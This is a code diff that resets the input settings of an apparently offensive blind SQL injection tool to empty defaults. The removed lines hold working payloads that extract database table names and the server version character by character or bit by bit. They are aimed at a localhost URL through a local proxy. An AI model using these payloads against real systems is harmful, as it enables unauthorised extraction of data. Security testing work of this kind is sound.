@@ -63,18 +63,14 @@ def userInputs(kwargs):
             Example: `url = http://127.0.0.1/?id={payload}`
             Example: `data = {"id":"{payload}"}`
     """
-    kwargs["payload"] = "substring(reverse(bin(ascii(substring((select table_name from information_schema.tables limit {offsetIndex},1),{charIndex},1)))),{bitIndex},1)=1"
-    kwargs["payload"] = "substring(reverse(bin(ascii(substring((select @@version),{charIndex},1)))),{bitIndex},1)=1"
-    #kwargs["payload"] = "ascii(substring((select table_name from information_schema.tables limit {offsetIndex},1),{charIndex},1))>={ascii}"
-    #kwargs["payload"] = "ascii(substring((select @@version),{charIndex},1)) between {ascii} and {max}"
-    kwargs["payload"] = "ascii(substring((select @@version),{charIndex},1)) >= {ascii}"
+    kwargs["payload"] = ""
     
     # Request Method (handles what the module requests can handle).
     kwargs["method"] = "get".lower()
 
     # URL
     # Example: `http://127.0.0.1/?id={payload}`
-    kwargs["url"] = "http://127.0.0.1/?x=0 or {payload}"
+    kwargs["url"] = ""
 
     """
         POST data in many format.
@@ -83,7 +79,7 @@ def userInputs(kwargs):
             XML: `"<element>{payload}</element>"`
             Multipart/form-data: `{"parameterName":("fileName","{payload}")}` or `{"parameterName":(None,"{payload}")}` or `{"parameterName":"{payload}"}`
     """
-    kwargs["data"] = ""
+    kwargs["data"] = {}
 
     """
         - JSON: [application/json or json]
@@ -118,7 +114,7 @@ def userInputs(kwargs):
     # The following parameter is used if you want to use boolean. The value of the parameter will be evaluated in order to know if it is true where `r` is the object containing the result of the requests.
     # Example: `"Found" in r.text` 
     # Example: `1 == r.json()["results"][0]["id"]`
-    kwargs["evalCondition"] = "\"<tr>\" in r.text"
+    kwargs["evalCondition"] = ""
     
     # True if you want to use time instead of boolean (False)
     kwargs["timeBased"] = False
@@ -132,8 +128,8 @@ def userInputs(kwargs):
     kwargs["requests"]["verify"] = False
     kwargs["requests"]["allow_redirects"] = False
     kwargs["requests"]["cookies"] = {}
-    kwargs["requests"]["headers"] = {"Content-Type":"application/xml"}
-    kwargs["requests"]["proxies"] = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
+    kwargs["requests"]["headers"] = {}
+    kwargs["requests"]["proxies"] = {}
 
 def main():
     parser = argparse.ArgumentParser()
